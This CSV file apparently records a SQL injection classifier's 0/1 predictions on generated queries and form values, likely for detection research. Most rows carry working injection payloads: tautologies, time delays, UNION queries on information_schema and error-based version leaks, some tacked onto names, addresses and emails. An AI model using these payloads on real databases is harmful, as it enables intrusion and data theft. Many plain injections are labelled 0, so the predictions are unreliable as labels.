Generated Queries,Prediction
SELECT getting OR 1=1 --,0
"ferrer del rio, 126 2?h OR 1=1",0
1'+  (  select plhk where 6540  =  6540 OR 'a'='a',1
SELECT * FROM more WHERE NOT height = 'bite'  AND NOT expression = 'aside' UNION SELECT * FROM information_schema.tables,0
SELECT * FROM short WHERE by BETWEEN '1996-07-01' AND '1996-07-31' AND SLEEP(5),0
"   SELECT class, fast, offer FROM beside WHERE arrive  IS NULL OR 1=1",0
"SELECT * FROM visit FETCH FIRST 3 ROWS ONLY AND IF(1=1, SLEEP(5), 0) --",0
salma OR 1=1,0
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  OR 1=1 --,1
select   (  case when   (  3435  =  4011  )   then 1 else 3435*  (  select 3435 from master..sysdatabases  )   end  )  -- AND SLEEP(5),1
SELECT * FROM easier WHERE soon = 'hunt'  OR minerals = 'from' AND SLEEP(5),0
SELECT * FROM become WHERE spend BETWEEN '1996-07-01' AND '1996-07-31',0
"1%'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  ' UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub",1
"-3450"" where 4478  =  4478 or 9323  =  9323#",1
SELECT TOP 50 PERCENT * FROM popular,0
FROM  ( SELECT DISTINCT end FROM but )  AND SLEEP(5),0
o.donnel,0
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb --",1
SELECT AVG ( laugh ) FROM onto AND SLEEP(5),0
ferne,0
"1',iif  (  9496  =  4153,1,1/0  )   OR 313d31",1
en9r195d9,0
anda matamalas UNION%20SELECT%20%2A,0
SELECT TOP 50 PERCENT * FROM bottle SELECT * FROM addition FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM son OR 1=1 --,0
SELECT * FROM course WHERE sink BETWEEN '1996-07-01' AND '1996-07-31' UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,0
"-7764"" or 7308  =  7805 UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub",1
"muduex AND 1=CONVERT(int, (SELECT @@version))",1
389,0
aun vilaregut OR 313d31,0
novallas,0
"  SELECT aroundID AS ID, appearance AS aid FROM child AND SLEEP(5)",0
6.50345E+15 AND SLEEP(5),0
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk AND IF(1=1, SLEEP(5), 0) --",1
"torrande gaitan AND IF(1=1, SLEEP(5), 0) --",1
caruth5@wave.com.pt UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,0
or 1  =  1# --,1
SELECT came ( s )  FROM seed SELECT tobacco FROM sick OR 'a'='a',0
carrer puigmercadal 33 5h AND SLEEP(5),1
"1  )   where 9860  =  9860 and 4443  =  4111-- AND 1=CONVERT(int, (SELECT @@version))",1
"-5160'  )   as kgjw where 9609  =  9609 union all select 9609,9609-- OR 1=1",1
"1%""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- AND IF(1=1, SLEEP(5), 0) --",1
1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703-- AND SLEEP(5),1
"1%""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""%""  =  "" UNION SELECT * FROM information_schema.tables",1
benalup-casas viejas AND SLEEP(5),1
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'hzav'  =  'hzav OR 1=1 --",1
SELECT AVG ( copy ) FROM slip SELECT SUM ( valley )  OR 313d31,0
"calle nicolas funes 116 AND 1=CONVERT(int, (SELECT @@version))",1
fogars de la selva AND SLEEP(5),0
SELECT listen ( s )  FROM trace SELECT whatever FROM aside,0
SELECT but ( s ) FROM cake INNER JOIN --,0
"1'  )   where 4092  =  4092 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- OR 'a'='a'",1
severiano AND SLEEP(5),1
r92e1*56e UNION%20SELECT%20%2A,0
"molinos, los",0
"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||' AND 1=CONVERT(int, (SELECT @@version))",1
SELECT * FROM handsome WHERE die LIKE '%race%' AND SLEEP(5),0
"calle marino cervera, 173, AND SLEEP(5)",0
wei-tsig8 AND SLEEP(5),1
brenna AND SLEEP(5),1
miramon@logiteclines.rs AND SLEEP(5),1
"c/ la estrella, 182 OR 1=1 --",0
travs elias --,0
SELECT * FROM hearing WHERE Price NOT BETWEEN 10 AND 20 AND SLEEP(5),0
"INSERT INTO standard  ( pond, real, tune )  VALUES  ( 'choice', 'sudden', 'tax' )   AND 1=CONVERT(int, (SELECT @@version))",0
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888 OR 'a'='a'",1
SELECT shade ( s )  FROM yard OR 'a'='a',0
organizar AND SLEEP(5),1
mirko AND SLEEP(5),1
"1"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- OR 1=1",1
SELECT * FROM feature WHERE taste BETWEEN '1996-07-01' AND '1996-07-31' OR 313d31,0
10650 OR 1=1 --,0
"   SELECT loud, fair+ ', ' + familiar+ ' ' + lunch+ ', ' + fence AS captured  FROM organized",0
SELECT * FROM language FETCH FIRST 3 ROWS ONLY OR 1=1,0
bo8iner4,0
SELECT * FROM anywhere WHERE one NOT LIKE '[attack]%' OR 1=1,0
SELECT * FROM figure WHERE ear = 'mean' LIMIT 3 UNION%20SELECT%20%2A,0
4.22605E+15 UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,0
SELECT AVG ( movie )  FROM whose  SELECT SUM ( rain )  OR 1=1 --,0
"  SELECT somewhere,list,up FROM log LEFT JOIN Orders ON income.pieID =  later.disappear ORDER BY summer.coast OR 1=1",0
"1   )    )    union all select null,null,null-- UNION SELECT * FROM information_schema.tables",1
select pg_sleep  (  5  )   and 'rpka'  =  'rpka AND SLEEP(5),1
"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf AND SLEEP(5)",1
